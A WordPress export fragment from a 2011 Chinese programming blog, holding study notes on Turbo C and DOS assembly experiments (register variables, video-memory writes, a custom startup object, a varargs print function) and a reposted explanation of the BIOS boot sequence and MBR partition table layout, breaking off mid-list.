		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>%e4%bd%bf%e7%94%a8rapidxml%e8%af%bb%e5%8f%96%e9%85%8d%e7%bd%ae%e6%96%87%e4%bb%b6</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[65]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1317535712]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_wp_old_slug</wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>print</title>
		<link>http://codemylife.blogcn.com/2011/10/%e6%b1%87%e7%bc%96%e8%af%ad%e8%a8%80%e7%ac%94%e8%ae%b0%e2%80%94%e2%80%94%e7%bb%bc%e5%90%88%e7%a0%94%e7%a9%b6/print/</link>
		<pubDate>Thu, 06 Oct 2011 11:34:45 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp06/M00/01/41/wKgKDU6NklUAAAAAAABgLnAJY9o453.png</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>114</wp:post_id>
		<wp:post_date>2011-10-06 19:34:45</wp:post_date>
		<wp:post_date_gmt>2011-10-06 11:34:45</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>print</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>113</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp06/M00/01/41/wKgKDU6NklUAAAAAAABgLnAJY9o453.png</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"660";s:6:"height";s:3:"442";s:14:"hwstring_small";s:23:"height='85' width='128'";s:5:"sizes";a:3:{s:9:"thumbnail";a:3:{s:5:"width";s:2:"88";s:6:"height";s:2:"88";s:3:"url";s:73:"http://files.blogcn.com/wp01/M00/02/8B/wKgKC06NklYAAAAAAAAYPzvdC3I106.png";}s:6:"medium";a:3:{s:5:"width";s:3:"188";s:6:"height";s:3:"125";s:3:"url";s:73:"http://files.blogcn.com/wp04/M00/02/3C/wKgKDU6NklYAAAAAAABFsUoe7lk268.png";}s:5:"large";a:3:{s:5:"width";s:3:"494";s:6:"height";s:3:"330";s:3:"url";s:73:"http://files.blogcn.com/wp02/M00/01/FB/wKgKC06NklYAAAAAAAEfEFU_SJE906.png";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}s:3:"url";s:73:"http://files.blogcn.com/wp03/M00/01/EE/wKgKC06NklUAAAAAAABgLkOq28k784.png";}]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>汇编语言笔记——综合研究</title>
		<link>http://codemylife.blogcn.com/2011/10/%e6%b1%87%e7%bc%96%e8%af%ad%e8%a8%80%e7%ac%94%e8%ae%b0%e2%80%94%e2%80%94%e7%bb%bc%e5%90%88%e7%a0%94%e7%a9%b6/</link>
		<pubDate>Thu, 06 Oct 2011 11:42:20 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category><![CDATA[汇编语言]]></category>

		<category domain="category" nicename="%e6%b1%87%e7%bc%96%e8%af%ad%e8%a8%80"><![CDATA[汇编语言]]></category>

		<category><![CDATA[读书]]></category>

		<category domain="category" nicename="%e8%af%bb%e4%b9%a6"><![CDATA[读书]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=113</guid>
		<description></description>
		<content:encoded><![CDATA[绳锯木断，水滴石穿。

不得不说王爽老师所著《汇编语言》确实是一本好书！如果说无论学习C语言、算法、编译原理等要读国外的好书，那么这本《汇编语言》是我目前以我的认知局限而言，可以和国外计算机名著相并列的！不仅传递知识，对于启发人的思维来说也是一本好书。

学习到现在，这本书的理论知识已经看完，所写日志和代码实际上是对知识的进一步巩固。接下言归正传：

<strong>研究试验二：使用寄存器</strong>
tc2.0提供的编译器支持寄存器名，形如 _AX 等。故我们在 main 函数中直接这样使用寄存器，url.c 如下：

[c]
main()
{
    _AX=1;
    _BX=1;
    _CX=2;
    _AX=_BX+_CX;
    _AH=_BL+_CL;
    _AL=_BH+_CH;
    printf(&quot;%x\n&quot;,main);
}
[/c]

可以在Debug中加载 url.exe，用 u 命令查看，发现并未出现我们想要的汇编代码。根据我们打印出来的<strong>main函数的地址为 0x1fa</strong>，u cs:01fa 命令查看，发现是main函数中的代码。main 函数后面有 ret 指令，可以设想，<strong>C语言中，函数实现为汇编语言中的子程序</strong>。

<strong>研究试验三：使用内存空间</strong>
不论寄存器，还是内存空间，都是存储空间，访问存储空间需要给出两个信息：（1）指明要访问存储空间的地址；（2）指明要访问存储空间有多大。

（1）如下使用内存空间：

[c]
main()
{
    *(char*)0x2000 = 'a';
    *(int*)0x2000 = 0xf;
    *(char far*)0x20001000 = 'a';
    _AX =  0x2000;
    *(char*)_AX = 'b';
    _BX = 0x1000;
    *(char*)(_BX+_BX) = 'a';
    *(char far*)(0x20001000 + _BX) = *(char*)_AX;
}
[/c]

（2）用一条C语句实现在屏幕的中间显示一个绿色的字符 'a'。

[c]
*(int far*)0xb8000730 = 0x0261;
[/c]

（3）C语言将全局变量放在数据段中，将局部变量放在栈中，每个函数开头的"push bp  mov bp, sp"用于保存栈桢，C语言将函数返回值保存在eax中。

（4）下面的程序向安全空间里面里面写入 'a' 到 'h' 8个字符：

[c]
#define Buffer ((char*)*(int far *)0x02000000)
main()
{
    Buffer = (char*)malloc(20);
    Buffer[10] = 0;
    while (Buffer[10] != 8)  {
        Buffer[Buffer[10]] = 'a' + Buffer[10];
        Buffer[10]++;
    }
}
[/c]


理解Buffer宏定义是关键，对比“char* Buffer =  (char*)malloc(20)”这样熟知的内存分配语句，不然理解，*(int far *)0x02000000 充当了 Buffer 变量的角色。

是的，Buffer是一个局部变量，也需要4字节的空间来存储，作者这样就相当于定义了局部变量Buffer（硬性指定地址为0x02000000），并向其写入所分配20个字节空间的首地址。不过局部变量说法不妥，以C语言内存的分配方式，这里的Buffer倒像是全局变量了。:）

<strong>研究试验四：不用main函数编程</strong>
如下程序：

[c title="f.c"]
f()
{
    *(char far*)(0xb8000000 + 160 * 10 + 80) = 'a';
    *(char far*)(0xb8000000 + 160 * 10 + 81) = 2;
}
[/c]


对其进行编译连接，在连接阶段会报错，出错信息：“Link Error：Undefined symbol '_main' in  module C0S”。根据出错信息推断可能与C0S.OBJ文件有关。

用 masm5 的 link.exe 对 tc.exe生成的 f.obj 文件进行连接，生成 f.exe 。用 Debug 加载 f.exe 查看汇编代码，发现 f.exe 的程序代码共29个字节（cx=0x001DH），f.exe 没有 int 21h，不能正确返回。f 函数的偏移地址为0。

而如下另一个程序：

[c title="m.c"]
main()
{
    *(char far*)(0xb8000000 + 160 * 10 + 80) = 'a';
    *(char far*)(0xb8000000 + 160 * 10 + 81) = 2;
}
[/c]


进行编译连接生成 m.exe。发现 m.exe 共0E3B个字节，能正确返回，查看 main 函数的汇编代码（cs:1fa）与 f 函数汇编代码相同。并找到了调用 main 函数的地方：cs:011a 处有：call 01fa。

对比可知，对 main 函数的调用指令和程序返回指令来自c0s.obj中。 tc.exe 把 c0s.obj 和用户的 obj 文件一同进行连接，生成 exe 文件，过程如下：
<ol>
	<li>c0s.obj 里的程序先运行，进行相关的初始化，比如，申请资源，设置DS、SS等寄存器；</li>
	<li>c0s.obj 里的程序调用 main 函数，用户程序从此开始运行；</li>
	<li>用户程序从 main 函数返回到 c0s.obj 的程序中；</li>
	<li>c0s.obj 的程序接着运行，进行先关资源的释放，环境恢复等工作；</li>
	<li>c0s.obj 的程序调用 DOS 的 int 21h 例程的 4ch 号功能，程序返回。</li>
</ol>

看来<strong>C程序要从main函数开始，是C语言的规定，这个规定不是在编译时保证的（tc.exe对f.c的编译可以通过），也不是在连接时保证的（虽然，tc.exe 文件对 f.obj 文件不能连接成 f.exe，但 link.exe 却可以），而是用如下机制保证的</strong>。

首先，C开发系统提供了用户写的应用程序正确运行所必须进行的初始化和程序返回等相关程序，这些程序存放在相关.obj文件（比如c0s.obj）中。

其次，需要将这些文件和用户的obj文件一起进行连接，才可生成正确的exe文件。

最后，在连接用户obj文件前面的由C语言开发系统提供的.obj文件里的程序要对main函数进行调用。

改写c0s.obj，程序c0s.asm如下：
 <pre class="asm">
assume cs:code
</br>
data segment
	db 128 dup(0)
data ends
</br>
code segment
start:
	mov ax, data
	mov ds, ax
	mov ss, ax
	mov sp, 128
</br>	
	call s
	mov ax, 4c00h
	int 21h
s:	
code ends
</br>
end start
</pre>
用生成的 c0s.obj 替换 tc2.0提供的 c0s.obj，这样就能生成 f.exe 了，查看其汇编代码，call s 的地方为 call 0012，而0012处是 f 函数的汇编代码。从这里可以看出，连接程序将 c0s.obj、f.obj的机器码是“拼接”在一起的。

<strong>研究试验五：函数接受不定数量的参数</strong>
C语言是从栈中取函数参数的，取多少个，在于你用什么方式告诉你调用的函数你传递参数的个数，从而实现了变参传递。而实际上，C语言只是根据你调用函数时，将参数压栈，对于一次确定的调用而言，参数个数是确定的，剩下的就是函数的处理过程而已——按照约定的结束方式，从栈上取参数。

以下实现变参print函数，只支持“%c、%d”。
[c title="print.c"]
#include&lt;stdio.h&gt;
/*	stack info eg.:
  sp,bp
	|
	bp ip addr 'A' 32 'a'
*/
void print(char* str, ...)
{
    char strNum[256];	/*for num str*/
    int stackIndex = 0, displayPos = 0;
    char* p = str;
    int num = 0;
    char* q = strNum;
    //trace str
    while (*p) {
	if (*p == '%') { /* wait parse */
	    p++;
	    if (*p == 'c') { /* char */
	        *(char far *)(0xb8000000 + 160*10 + displayPos) = *(int*)
                    (_BP + 6 + stackIndex);
		*(char far *)(0xb8000000 + 160*10 + displayPos + 1) = 2;	
		displayPos += 2;
		stackIndex += 2;
	    }
	    else if (*p == 'd') {	/* digit */
	        /* digit to str */
	        num = *(int*)(_BP + 6 + stackIndex);
		stackIndex += 2;
                //0
		if (num == 0) {
		    *(char far *)(0xb8000000 + 160*10 + displayPos) = 48;
		    *(char far *)(0xb8000000 + 160*10 + displayPos + 1) = 2;	
		    displayPos += 2;
		}
		//get digit char
		while (num) {
		    int x = num % 10;
		    num /= 10;
		    *q++ = x + 48;	/* num char */
		}
                //show digit	 char		
		for (; q != strNum; ) {
		    q--;
		    *(char far *)(0xb8000000 + 160*10 + displayPos) = *q;
		    *(char far *)(0xb8000000 + 160*10 + displayPos + 1) = 2;
		    displayPos += 2;
		}
	    }
	}
	else {	/* other */
	    char ch = *p;	
	    *(char far *)(0xb8000000 + 160*10 + displayPos) = ch;
	    *(char far *)(0xb8000000 + 160*10 + displayPos + 1) = 2;	
	    displayPos += 2;
	}
	p++;
    }
}
main()
{
	printf(&quot;%c + %d = %c&quot;, 'A', 32, 'a');
	print(&quot;%c + %d = %c&quot;, 'A', 32, 'a');
}
[/c]
结果：
<img src="http://files.blogcn.com/wp06/M00/01/41/wKgKDU6NklUAAAAAAABgLnAJY9o453.png" alt="print" />]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>113</wp:post_id>
		<wp:post_date>2011-10-06 19:42:20</wp:post_date>
		<wp:post_date_gmt>2011-10-06 11:42:20</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>%e6%b1%87%e7%bc%96%e8%af%ad%e8%a8%80%e7%ac%94%e8%ae%b0%e2%80%94%e2%80%94%e7%bb%bc%e5%90%88%e7%a0%94%e7%a9%b6</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[23]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1317912372]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_wp_old_slug</wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>系统引导过程</title>
		<link>http://codemylife.blogcn.com/2011/10/%e7%b3%bb%e7%bb%9f%e5%bc%95%e5%af%bc%e8%bf%87%e7%a8%8b/</link>
		<pubDate>Sat, 08 Oct 2011 10:44:01 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category><![CDATA[杂记]]></category>

		<category domain="category" nicename="%e6%9d%82%e8%ae%b0"><![CDATA[杂记]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=116</guid>
		<description></description>
		<content:encoded><![CDATA[以下文字转自 <a href="http://www.moon-soft.com/program/bbs/readelite739251.htm">通电之后……</a> 和 <a href="http://www.moon-soft.com/program/bbs/readelite739226.htm">从INT 19H开始……</a>

<strong>通电之后：</strong>

BIOS扮演的最重要的角色之一就是启动系统。当PC被打开时，它的系统内存中是空的，它需要马上找到一条代码以启动机器。这些代码就在BIOS中，因为BIOS被放置在ROM中，所以即使系统内存的其它部分是空的，但BIOS中的程序却总是可以使用的。

我们来看一看在Power-on之后的“硬件”Booting阶段，系统到底都做了些什么。同时，也看一看通过硬盘启动OS和软盘启动OS之间究竟存在着哪些不同。

第一推动力：CPU的第一条指令

CPU从物理地址FFFFFFF0h取出并执行硬件Reset之后的第一条指令。这个地址到最大物理地址4 GB之间只有16 Bytes的空间，包含软件初始化代码的EPROM必须被影射到这个地址。在Real Mode下，地址FFFFFFF0h超过了1 MB的物理地址范围。CS寄存器被分为两部分：可见的“Segment Selector”部分和隐藏的"Base Address"部分。

在Real Address Mode下，"Base Address"部分的值，等于将16-bit的"Segment Selector"左移4-bit所形成的20-bit地址，"Segment Selector"部分并不参与物理地址的计算，在Real Mode下，它仅仅被用来计算"Base Address"部分。而"Base Address"部分被真正的用于实际物理地址的计算。

在硬件Reset期间，CS中的"Segment Selector"部分被初始化为F000h，而"Base Address"部分被初始化为FFFF0000h，这与上述的原则不相符，但没有关系，因为"Base Address"已经有一个值了。所以，第一条指令的地址为Base Address + EIP = FFFF0000h + FFF0h = FFFFFFF0。

EPROM中放置着PC厂商所编写的代码（BIOS），被影射在地址FFFFFFF0h的代码必须为一条"far jump"或者"far call"指令或者产生一个中断，这样CS的"Segment Selector"的值将会被改变，从而"Base Address"部分的值也按照上述计算原则被改变为BIOS代码的影射地址。

从此以后，王子和公主过着幸福的生活……错了，是BIOS Boot Sequence代码开始被执行*_^。

<strong>从INT 19H开始：</strong>

系统BIOS是机器被加电之后首先被运行的程序。我们下面看一看一个典型的Boot Sequence所包含的步骤，当然，由于硬件BIOS厂商的不同，这些序列会有一些不同，但下面所列的，是你的主机被加电之后，通常都会发生的序列。

当机器被打开时，等电源稳定之后，电源会发送一个“加电成功信号”给芯片，以<strong>启动时钟生成器(8284)</strong>，然后，CPU重新自设定为初试状态，开始准备运行。

当CPU最初被启动的时候，系统RAM中是空的，没有任何内容可供执行。当然CPU设计者也知道这一点，所以他们对CPU进行了预先编程，以让CPU在这个阶段总是去查找系统BIOS ROM中的一个固定的位置，以<strong>启动BIOS Boot Program，这个位置为FFFF0h</strong>，这个位置是UMA临近结尾的位置。

之所以选择这个位置是因为，这样就不会引起由于ROM的大小改变而造成的兼容性问题。既然FFFF0h到UMA结束的位置之后16个字节，所以这里只放置着一个Jump指令，以进一步跳转到真正的BIOS startup program的位置。（不同的BIOS厂商可以将其放在不同的位置，只需要通过Jump指定就可以了）。

然后BIOS开始实施自检——Power-On Self Test(POST)，在这个过程中，如果遇到任何错误，Booting处理就会结束，机器会被挂起。

然后BIOS开始查找显示卡。精确的说，是查找被内建在<strong>BIOS内部的显示卡程序，并执行它，它通常被放在C0000h的内存位置，它的作用是初始化显示卡</strong>。绝大多数的现代显示卡都能够在显示器上显示它的相关信息。这就是为什么当我们开机的时候，首先会在显示器的顶端会出现关于显示卡的信息。

然后BIOS会查看其它设备的ROM，看一看这些设备之中哪些存在着BIOS，<strong>通常能够在C8000h的位置找到IDE/ATA硬盘的BIOS，并执行它们</strong>。如果找到任何其它设备的BIOSes，它们也会被执行。

然后BIOS显示它的启动屏幕。

然后BIOS开始做进一步的检测，包括我们可以看到的内存容量检测。在这个阶段，如果BIOS遇到任何错误，BIOS将会在屏幕上显示它的错误信息。

然后BIOS会根据自己的"系统资源列表“，来对系统资源进行进一步的检测以确定究竟那些系统资源（设备）被安装在机器上。有些计算机会逐步显示这些被检测到的设备。

如果BIOS支持Plug&amp;Play标准，它将会检测和配置Plug&amp;Play设备，并显示这些它找到的设备。

等着一些检测结束之后，BIOS会在系统屏幕上列出一个检测总结。

然后BIOS开始寻找一个启动设备，你可以通过配置BIOS来决定其搜索的顺序，这些设备包括Floppy Disk(A:)，或者Hard Disk(C:)，甚至还可以包括CD-ROM Driver或者其它设备。

当找到响应的启动设备之后，BIOS将会查找Boot信息以<strong>开始OS的启动过程。如果它找到了一个Hard Disk，它将会查找一个位于Cylinder 0, Head 0, Sector 1的Master Boot Record（硬盘的第一个扇区）</strong>，如果它找到的是Floppy Disk，它也会读区软盘的第一个扇区。

如果找不到任何启动设备，系统将会显示一条错误信息，然后冻结系统。如果找到了响应的启动设备，<strong>BIOS会将读到的扇区放在内存7C00h的位置，并跳转到那里执行它。从此以后，就有硬件启动阶段进入了OS启动阶段</strong>。

总之，这个阶段有大量的事情要做，比如自检，初始化各种芯片，控制器，与端口；包括显示器，内存，键盘，软驱，串口等等；在这个过程中BIOS将检测到的数据放置于1K到2K的RAM，这个区域因此也被称为BIOS Data Area；同时还将中断向量以及BIOS程序运行所需要的Stack设置置于0到1K的RAM。

最终，POST执行INT 19h中断，找到可以启动的磁盘，并<strong>将boot程序装入内存7C00h</strong>，并将控制权交给OS的boot程序。

当BIOS INT 19h被执行以后，系统进入OS Booting阶段。

<strong>几个术语：</strong>
<ul>
	<li>Master Booter： 放置于Hard disk的第一个扇区（即MBR），用于装载boot block的程序，466字节。</li>
	<li>Boot Sector：放置与Floppy的第一个扇区，或者Hard disk的某一分区的第一个扇区的用于装载Secondary boot，或其它程序的可运行程序，512字节。</li>
	<li>Secondary Boot：放置于非Floppy/Hard disk的第一个扇区，以及Hard disk的任意分区的第一个扇区之外的任意其它位置，用于装载OS，或其它程序的可运行程序。 无大小限制。</li>
</ul>
boot顺序：
<ul>
	<li>当用硬盘启动OS的时候，以上调用顺序为 MB -&gt; BS -&gt; SB -&gt; OS；</li>
	<li>当用软盘启动OS的时候，以上调用顺序为 BS -&gt; SB -&gt; OS。</li>
</ul>
<strong>硬盘启动：</strong>

硬盘的第一个扇区（sector）被称作MBR（Master Boot Record）。由于硬盘可以有多个分区，所以在MBR上，不仅放置着用于启动的可执行代码master boot，还放着磁盘分区表（DPT），占用66个字节，所以MBR中的可执行代码必须在512 - 66 = 446个字节以内。

MBR结构：
<table border="1" width="500" bordercolor="#9999ff">
<tbody>
<tr>
<td width="20" bgcolor="#9999ff"><span style="color: #ffffff;">偏移</span></td>
<td width="20" bgcolor="#9999ff"><span style="color: #ffffff;">内容</span></td>
<td width="20" bgcolor="#9999ff"><span style="color: #ffffff;"> 大小（字节）</span></td>
</tr>
<tr>
<td width="20"><span style="color: #0000ff;">0H</span></td>
<td width="20" align="center"><span style="color: #000000;">主引导程序</span></td>
<td width="20"><span style="color: #000080;">最大466 </span></td>
</tr>
<tr>
<td width="20"><span style="color: #0000ff;">01BEh</span></td>
<td width="20" align="center"><span style="color: #000000;">硬盘分区表(DPT)</span></td>
<td width="20"><span style="color: #000080;">64</span></td>
</tr>
<tr>
<td width="20"><span style="color: #0000ff;">01FEh </span></td>
<td width="20" align="center"><span style="color: #000000;">启动标志(0x55 0xAA)</span></td>
<td width="20"><span style="color: #000080;">2</span></td>
</tr>
</tbody>
</table>
硬盘分区表(DPT)结构：
<table border="1" width="500" bordercolor="#9999ff">
<tbody>
<tr>
<td width="20" bgcolor="#9999ff"><span style="color: #ffffff;">偏移</span></td>
<td width="20" bgcolor="#9999ff"><span style="color: #ffffff;">内容</span></td>
<td width="20" bgcolor="#9999ff"><span style="color: #ffffff;"> 大小（字节）</span></td>
</tr>
<tr>
<td width="20"><span style="color: #0000ff;">01BEh</span></td>
<td width="20" align="center"><span style="color: #000000;">分区1的分区数据表</span></td>
<td width="20"><span style="color: #000080;">16</span></td>
</tr>
<tr>
<td width="20"><span style="color: #0000ff;">01CEh</span></td>
<td width="20" align="center"><span style="color: #000000;">分区2的分区数据表</span></td>
<td width="20"><span style="color: #000080;">16</span></td>
</tr>
<tr>
<td width="20"><span style="color: #0000ff;">01DEh </span></td>
<td width="20" align="center"><span style="color: #000000;">分区3的分区数据表</span></td>
<td width="20"><span style="color: #000080;">16</span></td>
</tr>
<tr>
<td width="20"><span style="color: #0000ff;">01FEh </span></td>
<td width="20" align="center"><span style="color: #000000;">分区4的分区数据表</span></td>
<td width="20"><span style="color: #000080;">16</span></td>
</tr>
</tbody>
</table>
分区数据表（Partition Data Table）结构：
<table border="1" width="500" bordercolor="#9999ff">
<tbody>
<tr>
<td width="20" bgcolor="#9999ff"><span style="color: #ffffff;">偏移</span></td>
<td width="20" bgcolor="#9999ff"><span style="color: #ffffff;">内容</span></td>
<td width="20" bgcolor="#9999ff"><span style="color: #ffffff;"> 大小（字节）</span></td>
</tr>
<tr>
<td width="20"><span style="color: #0000ff;">00h</span></td>
<td width="20" align="center"><span style="color: #000000;">引导ID标记(Boot indicator) </span></td>
<td width="20"><span style="color: #000080;">1</span></td>
</tr>
<tr>
<td width="20"><span style="color: #0000ff;">01h</span></td>
<td width="20" align="center"><span style="color: #000000;">起始扇区头号</span></td>
<td width="20"><span style="color: #000080;">1</span></td>
</tr>
<tr>
<td width="20"><span style="color: #0000ff;">02h</span></td>
<td width="20" align="center"><span style="color: #000000;">起始扇区 (柱面号的最高2位)</span></td>
<td width="20"><span style="color: #000080;">1</span></td>
</tr>
<tr>
<td width="20"><span style="color: #0000ff;">03h</span></td>
<td width="20" align="center"><span style="color: #000000;">起始柱面号# (柱面号的低位)</span></td>
<td width="20"><span style="color: #000080;">1</span></td>
</tr>
<tr>
<td width="20"><span style="color: #0000ff;">04h</span></td>
<td width="20" align="center"><span style="color: #000000;">系统属性ID 标记</span></td>
<td width="20"><span style="color: #000080;">1</span></td>
</tr>
<tr>
<td width="20"><span style="color: #0000ff;">05h</span></td>
<td width="20" align="center"><span style="color: #000000;">结束扇区头号</span></td>
<td width="20"><span style="color: #000080;">1</span></td>
</tr>
<tr>
<td width="20"><span style="color: #0000ff;">06h</span></td>
<td width="20" align="center"><span style="color: #000000;">结束扇区(柱面号的最高2位)</span></td>
<td width="20"><span style="color: #000080;">1</span></td>
</tr>
<tr>
<td width="20"><span style="color: #0000ff;">07h</span></td>
<td width="20" align="center"><span style="color: #000000;">结束柱面号# (柱面号的低位)</span></td>
<td width="20"><span style="color: #000080;">1</span></td>
</tr>
<tr>
<td width="20"><span style="color: #0000ff;">08h</span></td>
<td width="20" align="center"><span style="color: #000000;">此分区前的扇区总数目</span></td>
<td width="20"><span style="color: #000080;">4</span></td>
</tr>
<tr>
<td width="20"><span style="color: #0000ff;">0Bh</span></td>
<td width="20" align="center"><span style="color: #000000;">此分区的扇区总数目</span></td>
<td width="20"><span style="color: #000080;">4</span></td>
</tr>
</tbody>
</table>
引导ID标记(Boot indicator)：
00h：不可启动分区
80h：可启动分区（只能有一个分区为此ID）

系统属性ID 标记(System Indicator )：
00h：未知操作系统
01h：DOS FAT12（16位扇区数）
02h：XENIX
04h：DOS FAT16（16位扇区数）
05h：DOS 扩展分区(DOS 3.3+)
06h：DOS 4.0 (Compaq 3.31), 32位扇区数
51h：Ontrack扩展分区
64h：Novell
75h：PCIX
DBh：CP/M
FFh：BBT

图示：<img src="http://files.blogcn.com/wp06/M00/03/46/wKgKDE6QR9YAAAAAAABEfBZYFVo123.jpg" alt="disk" />

注意：
十六进制标记55 AA，标志着一个有效的引导记录（boot sector）的结尾。每一个分区的引导记录中都必须有这个标记。

INT 19H是怎么处理启动的？
INT 19H会将MBR的512字节装载到内存0x7c00中，然后JUMP到0x7c00处，开始执行MBR的可执行程序（master booter），Master booter最起码需要做这些事情：

检测MAGIC（Signature）是否为合法值（十六进制55 AA）；

将自己移动到其它位置（一般是0x0600），将0x7C00到0x7c00+512K的空间让出来，以备其后将boot sector程序装入这个位置，这样才能和直接从软盘直接装入boot sector程序相一致；具体移动到什么位置，则根据设计而定，理论上，可以移动到任何非冲突位置（即没有被预留为其它程序所用的位置）；但一般情况下，都是在0X000800至0X0A0000之间寻找一端空间存放。

查看分区表，将被设为活动的分区的第一个Sector装入0X7C00的位置，正常的情况下，此Sector放置的就是boot sector程序；

最终，master booter跳转到0X7C00的位置，开始执行boot sector。

<strong>另见：</strong>
<ol>
	<li>POST - Cold Boot / Power On Self Test Activities ——POST - 冷启动、开机自检</li>
	<li>power supply starts Clock Generator (8284) with Power—— 通电后8284时序发生器开始工作</li>
	<li>Good signal on BUS——总线产生正常信号</li>
	<li>CPU reset line is pulsed resetting CPU——CPU的复位引脚被触发，CPU复位</li>
	<li>DS, ES, and SS are cleared to zero——DS，ES，SS初始值为0（CPU处于实模式下）</li>
</ol>
Cold and Warm Boot both execute the following sequence——冷启动和热启动都会执行一下序列
<ol>
	<li>CS:IP are set to FFFF:0000 (address of ROM POST code)——CS:IP初始值为FFFF:0000（该地址为BIOS的ROM POST代码）</li>
	<li>jump to CS:IP  (execute POST, Power On Self test)——CPU工作，开始取第一条指令（执行POST，开机自检）</li>
	<li>interrupts are disabled——关中断</li>
	<li>CPU flags are set, read/write/read test of CPU registers——设置CPU标志位，用读、写、读来测试CPU寄存器</li>
	<li>checksum test of ROM BIOS——检测ROM BIOS的校验和</li>
	<li>Initialize DMA (verify/init 8237 timer, begin DMA RAM refresh)——初始化DMA（校验、初始化 8237时钟控制器，开始DMA 内存刷新）</li>
	<li>save reset flag then read/write test the first 32K of memory——保存复位标志，然后对内存的前32K字节进行读写测试</li>
	<li>Initialize the Programmable Interrupt Controller (8259)and set 8 major BIOS ~interrupt~ vectors (interrupts 10h-17h)——初始化8259可编程中断控制器，设置好8个主要的BIOS中断向量(INT 10h-17H)</li>
	<li>determine and set configuration information——检测并设置好CMOS配置信息</li>
	<li>initialize/test CRT controller &amp; test video memory (unless 1234 have found in reset word)——初始化/测试CRT控制器，测试显存（除非在复位字的位置找到1234h）</li>
	<li>test ~8259~ Programmable Interrupt Controller——测试8259可编程中断控制器</li>
	<li>test Programmable Interrupt Timer (~8253~)——测试8253可编程时钟中断控制器</li>
	<li>reset/enable keyboard, verify scan code (AAh), clear keyboard,check for stuck keys, setup interrupt vector lookup table——复位、激活键盘，校验扫描码，清除键盘缓冲区，检查是否有卡住的键，设置中断查找表</li>
	<li> hardware interrupt vectors are set——设置硬件中断向量</li>
	<li>test for expansion box, test additional RAM——测试扩展设备，测试扩充内存</li>
